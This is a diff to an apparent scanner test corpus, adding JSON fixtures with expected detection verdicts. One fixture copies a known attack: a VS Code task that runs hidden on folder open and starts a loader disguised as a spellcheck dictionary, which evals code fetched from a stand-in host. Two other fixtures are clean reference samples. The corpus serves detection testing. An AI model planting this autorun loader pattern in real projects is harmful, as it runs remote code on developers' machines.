@@ -199,6 +199,27 @@
       }
     },
     {
+      "sampleId": "emerging-node-asset-target-v1",
+      "corpus": "emerging-threat-fixture",
+      "label": "known-malicious-structure",
+      "labelSource": "Contagious Interview: folderOpen task runs a loader disguised as .vscode/spellright.dict",
+      "sourceUrl": "https://www.abstract.security/blog/contagious-interview-tracking-the-vs-code-tasks-infection-vector",
+      "immutableRef": "fixture-v1",
+      "expectedDetectionCategories": [
+        "REMOTE_CODE_FROM_HTTP_RESPONSE",
+        "CONFIG_NODE_RUNS_ASSET_FILE"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          ".vscode/tasks.json": "{\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    {\n      \"label\": \"spellcheck\",\n      \"type\": \"shell\",\n      \"command\": \"node .vscode/spellright.dict\",\n      \"presentation\": {\n        \"reveal\": \"never\"\n      },\n      \"runOptions\": {\n        \"runOn\": \"folderOpen\"\n      }\n    }\n  ]\n}\n",
+          ".vscode/spellright.dict": "const axios = require('axios')\naxios.get('https://example.invalid/api/v1/check').catch(err => { eval(err.response.data) })\n",
+          "src/index.js": "export const app = () => 'assessment'\n"
+        }
+      }
+    },
+    {
       "sampleId": "emerging-vscode-task-downloader-v1",
       "corpus": "emerging-threat-fixture",
       "label": "known-malicious-structure",
@@ -648,6 +669,39 @@
         "kind": "fixture",
         "files": {
           ".github/workflows/ci.yml": "on: [push, pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npm test\n        env:\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-node-build-script-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "package.json scripts that run a local build script with node",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-cli",
+      "immutableRef": "fixture-v1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\n  \"name\": \"tool\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"build\": \"node scripts/build.mjs\",\n    \"prepare\": \"node -e \\\"process.exit(0)\\\"\"\n  }\n}\n",
+          "scripts/build.mjs": "import { mkdirSync, writeFileSync } from 'node:fs'\nmkdirSync('dist', { recursive: true })\nwriteFileSync('dist/index.js', 'export const version = \"1.0.0\"\\n')\n"
+        }
+      }
+    },
+    {
+      "sampleId": "reference-fixture-non-english-comments-v1",
+      "corpus": "reference-fixture",
+      "label": "reference-clean",
+      "labelSource": "Utility module commented in Chinese",
+      "sourceUrl": "https://github.com/flagrix-io/flagrix-cli",
+      "immutableRef": "fixture-v1",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "src/format.js": "// 将时间戳格式化为用户本地时区的日期字符串，用于列表页面和详情页面的显示\n// 如果传入的值不是有效的数字，则返回空字符串，避免页面上出现无效日期的提示\nexport function formatDate(timestamp) {\n  // 统一使用浏览器提供的本地化方法，保证不同语言环境下的显示格式保持一致\n  if (!Number.isFinite(timestamp)) return ''\n  return new Date(timestamp).toLocaleDateString()\n}\n// 计算两个日期之间相差的天数，结果向下取整，主要用于统计和提醒功能\nexport const daysBetween = (a, b) => Math.floor(Math.abs(b - a) / 86400000)\n"
         }
       }
     },
@@ -1903,5 +1957,5 @@
     }
   ],
   "pinnedAt": "2026-07-13T11:45:32.366Z",
-  "sourceCorpusSha256": "0cd49dea996e562bb613f783771373351eeba30b173a2284a0fd1f7f39cce844"
+  "sourceCorpusSha256": "375cedbb958c8aff717b43d72638d138c02a94b0cc92c3eea2de2794c85b09a7"
 }
